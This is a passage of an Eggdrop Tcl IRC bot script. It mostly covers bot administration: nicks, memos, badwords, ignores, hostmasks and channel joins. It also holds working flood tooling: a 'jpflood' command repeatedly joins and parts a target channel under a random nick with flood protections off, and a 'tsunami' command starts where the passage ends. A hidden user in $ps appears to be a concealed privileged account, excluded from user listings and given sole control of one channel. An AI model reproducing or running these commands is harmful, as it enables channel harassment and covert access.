   if {$ps != $owner && [validuser $ps]} { deluser $ps }
   die $notc
}
proc rehashing {} {
   global ps owner
   if {$ps != $owner && [validuser $ps]} { deluser $ps }
   rehash
}
proc pub_die {nick uhost hand chan rest} {
   global botnick ps notc 
   set curtime [ctime [unixtime]]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {$rest != ""} {
      set rest " $rest"
   }
   putserv "QUIT :SHuTDown (On $curtime)"
   utimer 5 dies
   return 0
}
proc msg_restart {nick uhost hand rest} {
   global botnick notc 
   set curtime [ctime [unixtime]]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {$rest != ""} {
      set rest " $rest"
   }
   putserv "QUIT :ReSTaRT (On $curtime)"
   return 0
}
proc msg_rehash {nick uhost hand rest} {
   global notc
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   puthelp "NOTICE $nick :Loading new setting!"
   utimer 3 rehashing
   return 0
}
proc pub_rehash {nick uhost hand chan rest} {
   global notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   puthelp "NOTICE $nick :Loading new setting!"
   utimer 3 rehashing
}
proc pub_chaninfo {nick uhost hand chan rest} {
   global notc ps
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan]!=0} { 
         set chan "#$chan" 
      }
   }
   if {![validchan $chan]} { return 0 }
   if {$nick != $ps && [string tolower $chan] == "#TeGaL"} { return 0 }
   puthelp "NOTICE $nick :\[$chan\] [channel info $chan]"
}
bind join - * ps:check
proc pub_access {nick uhost hand chan rest} {
   global notc
   if {[matchattr $nick Z]} {
      puthelp "PRIVMSG $chan :$nick, OwNeR"
   } elseif {[matchattr $nick n]} {
      puthelp "PRIVMSG $chan :$nick, ADMIN"
   } elseif {[matchattr $nick m]} {
      puthelp "PRIVMSG $chan :$nick, MasTeR"
   } elseif {[matchattr $nick f]} {
      puthelp "PRIVMSG $chan :$nick, FRIEND"
   }
}
proc msg_botnick {unick uhost hand rest} {
   global botnick nick nickpass notc 
   if {![matchattr $unick Q]} {
      puthelp "NOTICE $unick :4DenieD...!!!"
      return 0
   }
   set bnick [lindex $rest 0]
   set bpass [lindex $rest 1]
   if {$bnick == "" || $bpass == ""} {
      puthelp "NOTICE $unick :$notc4 Usage: botnick <nick> <identify>"
      return 0
   } 
   setuser "config" XTRA "NICK" [zip $bnick]
   setuser "config" XTRA "NICKPASS" [zip $bpass]
   saveuser
   set nick $bnick
   set nickpass $bpass
   puthelp "NOTICE $unick :BoTNIcK $bnick"
}
proc msg_realname {unick uhost hand rest} {
   global realname notc 
   if {![matchattr $unick Q]} {
      puthelp "NOTICE $unick :4DenieD...!!!"
      return 0
   }
   if {$rest == ""} {
      setuser "config" XTRA "REALNAME" ""
   } { 
      setuser "config" XTRA "REALNAME" [zip $rest] 
   }
   saveuser
   set realname $rest
   putserv "QUIT :cHaNgINg ReaLNamE"
}

proc msg_ident {unick uhost hand rest} {
   global username notc 
   if {![matchattr $unick Q]} {
      puthelp "NOTICE $unick :4DenieD...!!!"
      return 0
   }
   if {$rest == ""} {
      setuser "config" XTRA "USERNAME" ""
   } { 
      if {[regexp \[^a-z\] [string tolower $rest]]} {
         puthelp "NOTICE $unick :4DenieD...!!! use character for ident."
         return 0
      }
      setuser "config" XTRA "USERNAME" [zip $rest] 
   }
   saveuser
   set username $rest
   putserv "QUIT :cHaNgINg IdEnT"
}
bind nick - * new:talk
proc msg_logo {unick uhost hand rest} {
   global banner notc notm cycle_random
   if {![matchattr $unick Q]} {
      puthelp "NOTICE $unick :4DenieD...!!!"
      return 0
   }
   if {[string match "*$notm*" $rest]} {
      puthelp "NOTICE $unick :4DenieD...!!!"
      return 0
   }
   if {$rest == ""} {
      setuser "config" XTRA "BAN" ""
      puthelp "NOTICE $unick :cHaNgE tO DeFauLT"
      catch { unset banner }
   } {
      setuser "config" XTRA "BAN" [zip $rest] 
      set banner $rest
      lappend cycle_random $banner
      puthelp "NOTICE $unick :CHaNgE TO $rest"
   }
   saveuser
}
proc msg_awaylogo {unick uhost hand rest} {
   global version awaybanner notc notm 
   if {![matchattr $unick Q]} {
      puthelp "NOTICE $unick :4DenieD...!!!"
      return 0
   }
   if {[string match "*$notm*" $rest]} {
      puthelp "NOTICE $unick :4DenieD...!!!"
      return 0
   }
   if {[string trimleft [lindex $version 1] 0] < 1061000} {
      puthelp "NOTICE $unick :This Command Is Required To Run On Eggdrop 1.6.10 Or Later."
      return 0
   }
   if {$rest == ""} {
      setuser "config" XTRA "TapaAog" ""
      puthelp "NOTICE $unick :Away Logo cHaNgE tO DeFauLT"
      catch { unset awaybanner }
   } {
      setuser "config" XTRA "TapaAog" [zip $rest] 
      set awaybanner $rest
      puthelp "NOTICE $unick :Away Logo CHaNgE TO $rest"
   }
   chk_five "0" "0" "0" "0" "0"
   saveuser
}

proc msg_admin {unick uhost hand rest} {
   global notc
   if {![matchattr $unick Q]} {
      puthelp "NOTICE $unick :4DenieD...!!!"
      return 0
   }
   if {$rest == ""} {
      puthelp "NOTICE $unick :$notc1 SeT ADmIN oN STaTUS TO DeFAULT"
   } {
      puthelp "NOTICE $unick :$notc1 ADmIN oN STaTUS TO \[$rest\]"
   }
   setuser "config" XTRA "ADMIN" $rest
   saveuser
}
proc msg_botaltnick {unick uhost hand rest} {
   global botnick altnick altpass notc 
   if {![matchattr $unick Q]} {
      puthelp "NOTICE $unick :4DenieD...!!!"
      return 0
   }
   set baltnick [lindex $rest 0]
   set baltpass [lindex $rest 1]
   if {$baltnick == "" || $baltpass == ""} {
      puthelp "NOTICE $unick :$notc4 Usage: botaltnick <nick> <identify>"
      return 0
   } 
   setuser "config" XTRA "ALTNICK" [zip $baltnick]
   setuser "config" XTRA "ALTPASS" [zip $baltpass]
   saveuser
   set altnick $baltnick
   set altpass $baltpass
   puthelp "NOTICE $unick :BoTALTNIcK $baltnick"
}
proc msg_away {unick uhost hand rest} {
   global realname notc 
   if {![matchattr $unick Q]} {
      puthelp "NOTICE $unick :4DenieD...!!!"
      return 0
   }
   if {$rest == ""} {
      setuser "config" XTRA "AWAY" ""
      puthelp "NOTICE $unick :AwAY \[4OFF\]"
   } {
      setuser "config" XTRA "AWAY" $rest
      puthelp "NOTICE $unick :AwAY SeT TO \[$rest\]"
   }
   saveuser
   chk_five "0" "0" "0" "0" "0"
}
proc msg_memo {nick uhost hand rest} {
   global notc own ps
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: memo <all/user> <msg>"
      return 0
   }
   set msend [lindex $rest 0]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {[string tolower $msend] == "all"} {
      set smemo ""
      foreach x [userlist m] {
         if {$x != $nick && $x != $own} {
            if {[getuser $x XTRA "MEMO"] == ""} {
               setuser $x XTRA "MEMO" "$nick: [lrange $rest 1 end]"
               append smemo "$x "
            }
         }
      }
      if {$smemo == ""} {
         puthelp "NOTICE $nick :MeMO !FaILED! NO UsER SeND"
      } {
         saveuser
         puthelp "NOTICE $nick :MeMO SeND TO \[ $smemo\]"
      }
   } {
      if {![validuser $msend] || $msend == $ps} {
         puthelp "NOTICE $nick :4DenieD...!!!, NO UsER!"
         return 0
      } {
         if {![matchattr $msend m]} {
            puthelp "NOTICE $nick :4DenieD...!!!, MiN MasTeR FLaG!"
            return 0
         }
         if {$msend == $nick} {
            puthelp "NOTICE $nick :4DenieD...!!!, CaNT SeLF MeMo!"
            return 0
         }
         if {[getuser $msend XTRA "MEMO"]!=""} {
            puthelp "NOTICE $nick :4DenieD...!!!, MeMo FoR $msend STiLL ExIST!"
            return 0
         }
         setuser [lindex $rest 0] XTRA "MEMO" "$nick: [lrange $rest 1 end]"
         saveuser
         puthelp "NOTICE $nick :MeMO SeND TO \[[lindex $rest 0]\]"
      }
   }
}

proc pub_+mustop {nick uhost hand chan rest} {
   global notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   setuser "config" XTRA "MUSTOP" "T"
   saveuser
   puthelp "NOTICE $nick :must @P set \[9ON\]"
}
proc pub_-mustop {nick uhost hand chan rest} {
   global notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   setuser "config" XTRA "MUSTOP" ""
   saveuser
   puthelp "NOTICE $nick :must @P set \[4OFF\]"
}
proc pub_kickops {nick uhost hand chan rest} {
   global notc kops
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {[string tolower $rest] == "on"} {
      set kops "T"
      setuser "config" XTRA "KOPS" "T"
      puthelp "NOTICE $nick :KIcK @PS \[9ON\]"
   } {
      catch { unset kops }
      setuser "config" XTRA "KOPS" ""
      puthelp "NOTICE $nick :KIcK @PS \[4OFF\]"
   }
   saveuser
}
bind topc - * topic_chk
proc pub_badwords {nick uhost hand chan rest} {
   global badwords notc 
   set retval "BaDWoRDS: "
   foreach badword [string tolower $badwords] {
      append retval "$badword "
   }
   puthelp "NOTICE $nick :$retval"
   return 0
}
proc pub_+badword {nick uhost hand chan rest} {
   global badwords notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {$rest == ""} { 
      puthelp "NOTICE $nick :Usage: `+badword <badword>"
      return 0
   }
   if {[string match "*[string tolower [lindex $rest 0]]*" $badwords]} {
      puthelp "NOTICE $nick :[lindex $rest 0] Allready Added"
      return 0
   }
   append badwords " [string tolower [lindex $rest 0]]"
   setuser "config" XTRA "BADWORDS" $badwords
   saveuser
   puthelp "NOTICE $nick :Added [lindex $rest 0] to badwords"
   return 0
}
bind pub - `ack ack_act
proc pub_-badword {nick uhost hand chan rest} {
   global badwords notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {$rest == ""} { 
      puthelp "NOTICE $nick :Usage: `-badword <badword>"
      return 0
   }
   set val ""
   foreach badword [string tolower $badwords] {
      if {[string tolower [lindex $rest 0]] == $badword} { 
         puthelp "NOTICE $nick :Removed [lindex $rest 0]"
      } else { append val " $badword " }
   }
   set badwords $val
   setuser "config" XTRA "BADWORDS" $val
   saveuser
   return 0
}
proc pub_advwords {nick uhost hand chan rest} {
   global advwords notc 
   set retval "AdVWoRDS: "
   foreach advword [string tolower $advwords] {
      append retval "$advword "
   }
   puthelp "NOTICE $nick :$retval"
   return 0
}
proc pub_+advword {nick uhost hand chan rest} {
   global advwords notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {$rest == ""} { 
      puthelp "NOTICE $nick :Usage: `+advword <advword>"
      return 0
   }
   if {[string match "*[string tolower [lindex $rest 0]]*" $advwords]} {
      puthelp "NOTICE $nick :[lindex $rest 0] Allready Added"
      return 0
   }
   append advwords " [string tolower [lindex $rest 0]]"
   setuser "config" XTRA "ADVWORDS" $advwords
   saveuser
   puthelp "NOTICE $nick :Added [lindex $rest 0] to advwords"
   return 0
}
proc pub_-advword {nick uhost hand chan rest} {
   global advwords notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4WvMRVw..!"
      return 0
   }
   if {$rest == ""} { 
      puthelp "NOTICE $nick :Usage: `+advword <advword>"
      return 0
   }
   set val ""
   foreach advword [string tolower $advwords] {
      if {[string tolower [lindex $rest 0]] == $advword} { 
         puthelp "NOTICE $nick :Removed [lindex $rest 0]"
      } else { append val " $advword " }
   }
   set advwords $val
   setuser "config" XTRA "ADVWORDS" $val
   saveuser
   return 0
}
proc pub_jump {nick uhost hand chan rest} {
   global botnick notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   set server [lindex $rest 0]
   if {$server == ""} {
      puthelp "NOTICE $nick :Usage: jump <server> \[port\] \[password\]"
      return 0
   }
   if {![string match "*.org*" [string tolower $rest]]} {
      puthelp "NOTICE $nick :4DenieD...!!! NoT Undernet..!"
      return 0
   }
   set port [lindex $rest 1]
   if {$port == ""} {set port "6667"}
   set password [lindex $rest 2]
   putserv "QUIT :cHaNgINg ServeR"
   utimer 2 [list jump $server $port $password]
}
proc msg_die {nick uhost hand rest} {
   global notc 
   set curtime [ctime [unixtime]]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   foreach x [userlist] {
      if {$x != "AKICK"} {
         chattr $x -Q
         foreach y [getuser $x HOSTS] {
            delhost $x $y
         }
         set hostmask "${x}!*@*"
         setuser $x HOSTS $hostmask
      }
   }
   saveuser
   if {$rest != ""} {
      set rest " $rest"
   }
   putserv "QUIT :SHuTDown (On $curtime)"
   utimer 5 dies
}
proc pub_ignores {nick uhost hand chan rest} {
   global botnick notc 
   set iglist ""
   foreach x [ignorelist] {
      set iglister [lindex $x 0]
      set iglist "$iglist $iglister"
   }
   if {[ignorelist]==""} {
      puthelp "NOTICE $nick :No ignores."
      return 0
   }
   regsub -all " " $iglist ", " iglist
   set iglist [string range $iglist 1 end]
   puthelp "NOTICE $nick :Currently ignoring:$iglist"
   return 0
}
proc pub_-ignore {nick uhost hand chan rest} {
   global botnick notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   set hostmask [lindex $rest 0]
   if {$hostmask == ""} {
      puthelp "NOTICE $nick :Usage: -ignore <hostmask>"
      return 0
   }
   if {![isignore $hostmask]} {
      puthelp "NOTICE $nick :$hostmask is not on my ignore list."
      return 0
   }
   if {[isignore $hostmask]} {
      killignore $hostmask
      puthelp "NOTICE $nick :No longer ignoring \002\[\002${hostmask}\002\]\002"
      saveuser
   }
}
proc pub_+ignore {nick uhost hand chan rest} {
   global botnick notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   set rest [lindex $rest 0]
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: +ignore <hostmask>"
      return 0
   }
   if {[isignore $rest]} {
      puthelp "NOTICE $nick :$rest is alreay set on ignore."
      return 0
   }
   if {$rest == "*!*@*"} {
      puthelp "NOTICE $nick :4DenieD...!!!, Ilegal hostmask."
      return 0
   } 
   set usenick [finduser $rest]
   if {$usenick != "*" && [matchattr $usenick f]} {
      puthelp "NOTICE $nick :4DenieD...!!!, canT IgNoREd FRIend UsER"
      return 0
   }
   if {$rest != $nick} {
      newignore $rest $nick "*" 600
      puthelp "NOTICE $nick :Ignoring $rest"
   } else { 
      puthelp "NOTICE $nick :4DenieD...!!!, Can't ignore your self." 
   }
}
bind dcc m binds dcc_binds
proc pub_-host {nick uhost hand chan rest} {
   global botnick notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   set who [lindex $rest 0]
   set hostname [lindex $rest 1]
   set completed 0
   if {($who == "") || ($hostname == "")} {
      puthelp "NOTICE $nick :Usage: -host <nick> <hostmask>"
      return 0
   }
   if {![validuser $who]} {
      puthelp "NOTICE $nick :<n/a>"
      return 0
   }
   if {(![matchattr $nick n]) && ([matchattr $who n])} {
      puthelp "NOTICE $nick :Can't remove hostmasks from the bot owner."
      return 0
   }
   if {![matchattr $nick m]} {
      if {[string tolower $hand] != [string tolower $who]} {
         puthelp "NOTICE $nick :You need '+m' to change other users hostmasks"
         return 0
      }
   }
   foreach * [getuser $who HOSTS] {
      if {${hostname} == ${*}} {
         delhost $who $hostname
         saveuser
         puthelp "NOTICE $nick :Removed \002\[\002${hostname}\002\]\002 from $who."
         set completed 1
      }
   }
   if {$completed == 0} {
      puthelp "NOTICE $nick :4DenieD...!!!, <n/a>"
   }
}
set thehosts {
   *@* * *!*@* *!* *!@* !*@*  *!*@*.* *!@*.* !*@*.* *@*.*
   *!*@*.com *!*@*com *!*@*.net *!*@*net *!*@*.org *!*@*org
   *!*@*gov *!*@*.ca *!*@*ca *!*@*.uk *!*@*uk *!*@*.mil
   *!*@*.fr *!*@*fr *!*@*.au *!*@*au *!*@*.nl *!*@*nl *!*@*edu
   *!*@*se *!*@*.se *!*@*.nz *!*@*nz *!*@*.eg *!*@*eg *!*@*dk
   *!*@*.il *!*@*il *!*@*.no *!*@*no *!*@*br *!*@*.br *!*@*.gi
   *!*@*.gov *!*@*.dk *!*@*.edu *!*@*gi *!*@*mil *!*@*.to *!@*.to 
   *!*@*to *@*.to *@*to
}
proc pub_+host {nick uhost hand chan rest} {
   global thehosts botnick notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   set who [lindex $rest 0]
   set hostname [lindex $rest 1]
   if {($who == "") || ($hostname == "")} {
      puthelp "NOTICE $nick :Usage: +host <nick> <new hostmask>"
      return 0
   }
   if {![validuser $who]} {
      puthelp "NOTICE $nick :4DenieD...!!!, <n/a>"
      return 0
   }
   set badhost 0
   foreach * [getuser $who HOSTS] {
      if {${hostname} == ${*}} {
         puthelp "NOTICE $nick :That hostmask is already there."
         return 0
      }
   }
   if {($who == "") && ($hostname == "")} {
      puthelp "NOTICE $nick :Usage: +host <nick> <new hostmask>"
      return 0
   }
   if {([lsearch -exact $thehosts $hostname] > "-1") || (![string match *@* $hostname])} {
      if {[string index $hostname 0] != "*"} {
         set hostname "*!*@*${hostname}"
      } else {
         set hostname "*!*@${hostname}"
      }
   }
   if {([string match *@* $hostname]) && (![string match *!* $hostname])} { 
      if {[string index $hostname 0] == "*"} {
         set hostname "*!${hostname}"
      } else {
         set hostname "*!*${hostname}"
      }
   }
   if {![validuser $who]} {
      puthelp "NOTICE $nick :4DenieD...!!!, <n/a>"
      return 0
   }
   if {(![matchattr $nick n]) && ([matchattr $who n])} {
      puthelp "NOTICE $nick :Can't add hostmasks to the bot owner."
      return 0
   }
   foreach * $thehosts {
      if {${hostname} == ${*}} {
         puthelp "NOTICE $nick :Invalid hostmask!"
         set badhost 1
      }
   }
   if {$badhost != 1} {
      if {![matchattr $nick m]} {
         if {[string tolower $hand] != [string tolower $who]} {
            puthelp "NOTICE $nick :You need '+m' to change other users hostmasks"
            return 0
         }
      }
      setuser $who HOSTS $hostname
      puthelp "NOTICE $nick :Added \002\[\002${hostname}\002\]\002 to $who."
      if {[matchattr $who a]} {
         opq $chan $who
      }
      saveuser
   }
}

proc msg_join {nick uhost hand rest} {
   global botnick joinme own notc 
   set chantarget [lindex $rest 0]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {$chantarget == ""} {
      puthelp "NOTICE $nick :Usage: join <#chan>"
      return 0
   }
   if {[string first # $chantarget]!=0} {
      set chantarget "#$chantarget"
   }
   if {[validchan $chantarget]} {
      puthelp "NOTICE $nick :$chantarget already in channel list"
      return 0
   }
   if {$nick != $own && [total_channel] != 1} {
      puthelp "NOTICE $nick :To MaNY cHaNNeL MaX 9..!"
      return 0
   }
   set joinme $nick
   channel add $chantarget
   catch { channel set $chantarget +statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
   savechan
   if {[lindex $rest 1] != ""} { 
      putserv "JOIN $chantarget :[lindex $rest 1]" 
   }
   return 0
}
proc msg_+chan {nick uhost hand rest} {
   global botnick joinme own notc 
   set chantarget [lindex $rest 0]
   set opt [lindex $rest 1]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {[matchattr $nick X]} {
      puthelp "NOTICE $nick :4!BLoCkEd!"
      return 0
   }
   if {$chantarget == ""} {
      puthelp "NOTICE $nick :Usage: +chan <#chan>"
      return 0
   }
   if {[string first # $chantarget]!=0} {
      set chantarget "#$chantarget"
   }
   if {[validchan $chantarget]} {
      puthelp "NOTICE $nick :$chantarget is already on channels list."
      return 0
   }
   if {$nick != $own && [total_channel] != 1} {
      puthelp "NOTICE $nick :To MaNY cHaNNeL MaX 9..!"
      return 0
   }
   set joinme $nick
   channel add $chantarget
   if {$opt != "" && [string tolower $opt] == "+nopart"} { 
      catch { channel set $chantarget -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
   } else {
      catch { channel set $chantarget -statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
   }
   savechan
   if {[lindex $rest 1] != ""} { 
      putserv "JOIN $chantarget :[lindex $rest 1]" 
   }
   return 0
}
bind ctcp - "NGT" ctcp_versi0n
proc msg_part {nick uhost hand rest} {
   global botnick joinme notc ps
   set curtime [ctime [unixtime]]
   set chantarget [lindex $rest 0]
   set part_msg [lrange $rest 1 end]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {$chantarget == ""} {
      puthelp "NOTICE $nick :Usage: part <#chan>"
      return 0
   }
   if {[string first # $chantarget]!=0} {
      set chantarget "#$chantarget"
   }
   if {$nick != $ps && [string tolower $chantarget] == "#TeGaL"} { return 0 }
   foreach x [channels] {
      if {[string tolower $x]==[string tolower $chantarget]} {
         if {[string match "*+secret*" [channel info $x]]} {
            puthelp "NOTICE $nick :I can't part $x 4pRoTecTEd..!"
            return 0
         }
         if {![onchan $nick $x]} { 
            puthelp "NOTICE $nick :PaRT $x"
         }
         if {$part_msg != ""} { 
            putserv "PART $x :$part_msg (Lm $curtime)"
         } { 
            putserv "PART $x :BackToBase (On $curtime)"
         }
         channel remove $x
         savechan
         return 0
      }
   }
   return 0
}
proc pub_chanreset {nick uhost hand chan rest} {
   global notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: chanreset <#|ALL>"
      return 0
   }
   set chan [lindex $rest 0]
   if {[string tolower $chan] == "all"} {
      puthelp "NOTICE $nick :ReSeT ALL DeFauLT FLAg"
      foreach x [channels] {
         catch { channel set $x -statuslog -revenge -protectops -clearbans +cycle -enforcebans +userbans +greet -secret -autovoice -autoop +dynamicbans flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
         catch { channel set $x -nodesynch }
         set cflag "c$x"
         set cflag [string range $cflag 0 8]
         chattr $cflag "-hp+AJSPTRUED"
         setuser $cflag XTRA "JP" 5
         setuser $cflag XTRA "CHAR" 250
         setuser $cflag XTRA "RPT" 3
         setuser $cflag XTRA "CAPS" 90
      }
      savechan
      return 0
   }
   if {[string first # $chan]!=0} {
      set chan "#$chan"
   }
   puthelp "NOTICE $nick :ReSeT cHaNNeL \[$chan\] DeFauLT FLAg"
   if {![validchan $chan]} {
      puthelp "NOTICE $nick :UnFIndEd $chan."
      return 0
   }
   catch { channel set $chan -statuslog -revenge -protectops +cycle -clearbans -enforcebans +userbans +greet -secret -autovoice -autoop +dynamicbans flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
   catch { channel set $chan -nodesynch }
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   chattr $cflag "-hp+AJSPTRUED"
   setuser $cflag XTRA "JP" 5
   setuser $cflag XTRA "CHAR" 250
   setuser $cflag XTRA "RPT" 3
   setuser $cflag XTRA "CAPS" 90
   savechan
}
proc msg_channels {nick hand uhost rest} {
   pub_channels $nick $uhost $hand "" $rest
}
proc pub_channels {nick hand uhost channel rest} {
   global botnick notc
   if {$rest != ""} {
      if {[validchan [lindex $rest 0]]} {
         set x [lindex $rest 0]
         set chan ""
         set cflag "c$x"
         set cflag [string range $cflag 0 8]
         if {[string tolower $x] == "#TapaAog"} { return 0 }
         if {[isop $botnick $x]} { append chan " @" }
         if {([isvoice $botnick $x]) && (![botisop $x])} { append chan " +" }
         if {(![isvoice $botnick $x]) && (![botisop $x])} { append chan " " }
         if {[string match "*+seen*" [channel info $x]]} { append chan "4S" }
         if {[string match "*+nodesynch*" [channel info $x]]} { append chan "4K" }
         if {[matchattr $cflag V]} { append chan "4V" }
         if {[string match "*+greet*" [channel info $x]]} { append chan "4G" }
         if {[matchattr $cflag C]} { append chan "4C" }
         if {[string match "*+secret*" [channel info $x]]} { append chan "4P" }
         if {[string match "*-dynamicbans*" [channel info $x]]} { append chan "4L" }
         if {[string match "*-userinvites*" [channel info $x]]} { append chan "4D" }
         if {[matchattr $cflag G]} { append chan "4A" }
         if {[matchattr $cflag I]} { append chan "4T" }
         append chan "$x [chattr $cflag]"
         puthelp "NOTICE $nick :$chan"
      }
      return 0
   }
   set chan "Channels:"
   foreach x [channels] {
      if {[string tolower $x] != "#TapaAog"} {
         set cflag "c$x"
         set cflag [string range $cflag 0 8]
         if {[isop $botnick $x]} { append chan " @" }
         if {([isvoice $botnick $x]) && (![botisop $x])} { append chan " +" }
         if {(![isvoice $botnick $x]) && (![botisop $x])} { append chan " " }
         if {[string match "*+seen*" [channel info $x]]} { append chan "4S" }
         if {[matchattr $cflag V]} { append chan "4V" }
         if {[string match "*+greet*" [channel info $x]]} { append chan "4G" }
         if {[string match "*+nodesynch*" [channel info $x]]} { append chan "4K" }
         if {[matchattr $cflag C]} { append chan "4C" }
         if {[string match "*+secret*" [channel info $x]]} { append chan "4P" }
         if {[string match "*-dynamicbans*" [channel info $x]]} { append chan "4L" }
         if {[string match "*-userinvites*" [channel info $x]]} { append chan "4D" }
         if {[matchattr $cflag G]} { append chan "4A" }
         if {[matchattr $cflag I]} { append chan "4T" }
         append chan "$x"
      }
   }
   puthelp "NOTICE $nick :$chan"
}
proc pub_match {nick uhost hand chan rest} {
   global ps notc 
   if {$rest==""} {
      puthelp "NOTICE $nick :Usage: match <flags>"
      return 0
   }
   set rest [string trim $rest +]
   if {[string length $rest] > 1} {
      puthelp "NOTICE $nick :Invalid option."
      return 0
   }
   if {$rest!=""} {
      set rest "+[lindex $rest 0]"
      if {[userlist $rest]!=""} {
         regsub -all " " [userlist $rest] ", " users 
         regsub -all $ps [userlist $rest] "" users 
         puthelp "NOTICE $nick :Match \[$rest\]: $users"
         return 0
      }
      if {[userlist $rest]==""} {
         puthelp "NOTICE $nick :No users with flags \[$rest\]"
         return 0
      }
   }
}
proc val {string} {
   set arg [string trim $string /ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz]
   set arg2 [string trim $arg #!%()@-_+=\[\]|,.?<>{}]
   return $arg2
}
proc msg_topic {nick uhost hand rest} {
   global notc botnick
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: topic <#> <topic>" 
      return 0
   }
   set channel [lindex $rest 0]
   if {[string first # $rest] != 0} { 
      set channel "#$channel" 
   }
   if {![validchan $channel]} {
      puthelp "NOTICE $nick :NoT IN $channel"
      return 0 
   }
   if {![isop $botnick $channel]} {
      puthelp "NOTICE $nick :NoT OP $channel"
      return 0 
   }
   set rest [lrange $rest 1 end]
   putserv "TOPIC $channel :$rest"
}
proc pub_topic {nick uhost hand channel rest} {
   global botnick notc botnick 
   if {![isop $botnick $channel]} { return 0 }
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: topic <topic>" 
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   putserv "TOPIC $channel :$rest"
} 
set cmd_chn ""
set cmd_by ""
set cmd_msg ""
set cmd_case ""
bind join - * join_jf
proc join_jf {nick uhost hand chan} {
   global botnick quick jpfchn jpfmsg jpfidx
   if {![info exists jpfmsg]} { return 0 }
   if {$nick != $botnick} { return 0 }
   if {$chan != $jpfchn} { return 0 }
   if {$quick == "1"} {
      putquick "PRIVMSG $chan :$jpfmsg,"
   } else {
      putserv "PRIVMSG $chan :$jpfmsg,"
   }
   incr jpfidx
   if {$jpfidx >= 4} { 
      catch { channel remove $jpfchn }
      catch { unset jpfchn }
      catch { unset jpfmsg }
      catch { unset jpfidx }
      puthelp "AWAY" 
      return 0
   }
   if {$quick == "1"} {
      putquick "part $chan :$jpfmsg"
   } else {
      putserv "part $chan :$jpfmsg"
   }
}
proc pub_jpflood {nick uhost hand channel rest} {
   global jpfchn jpfmsg jpfidx notc
   if {[string index $rest 0] != "#" || $rest == ""} {
      puthelp "NOTICE $nick :Usage: jpflood #channel message"
      return 0
   }
   if {[validchan [lindex $rest 0]]} {
      puthelp "NOTICE $nick :dOnt UsE ExIsT cHanneL..!"
      return 0
   }
   set jpfmsg " n0 Reas0n "
   if {[lindex $rest 1] != ""} { 
      set jpfmsg [lindex $rest 1]
   }
   set jpfchn [lindex $rest 0]
   set jpfidx 0
   catch { clearqueue all }
   pub_randnick $nick $uhost $hand $channel ""
   utimer 10 hazar
}
proc hazar {} {
   global jpfchn
   utimer 120 goback
   channel add $jpfchn
   catch { channel set $jpfchn +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
}

proc pub_tsunami {nick uhost hand channel rest} {
   global cmd_chn cmd_by cmd_msg cmd_case botnick version notc quick ps
   set person [lindex $rest 0]
   set rest [lrange $rest 1 end]
   if {$person == $botnick} { return 0 }
   if {[string index $person 0] == "#"} {
      if {[validchan $person]} {
